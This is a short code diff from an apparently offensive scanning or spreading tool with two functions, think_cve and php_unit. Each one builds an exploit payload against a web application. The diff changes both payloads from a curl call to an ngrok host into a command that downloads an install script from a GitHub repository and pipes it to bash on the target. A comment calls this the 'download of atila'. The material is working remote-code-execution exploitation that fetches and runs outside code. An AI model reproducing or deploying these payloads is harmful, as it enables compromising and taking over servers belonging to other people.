@@ -51,7 +51,7 @@ def think_cve( target )  :
 
 
 
-   payload = '/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=curl  https://knapsack-trickster-dance.ngrok-free.dev/hunos'
+   payload = '/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=curl  -L https://github.com/atilabyte/golang/raw/refs/heads/master/scripts/install.sh   |  bash'
    
 
 
@@ -87,7 +87,7 @@ def php_unit( target ) :
 
 
 
-    payload  =    '<?php  system ("curl  https://knapsack-trickster-dance.ngrok-free.dev/hunos"); ?>'   #download of atila
+    payload  =    '<?php  system ("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/scripts/install.sh | bash"); ?>'   #download of atila
 
 
 
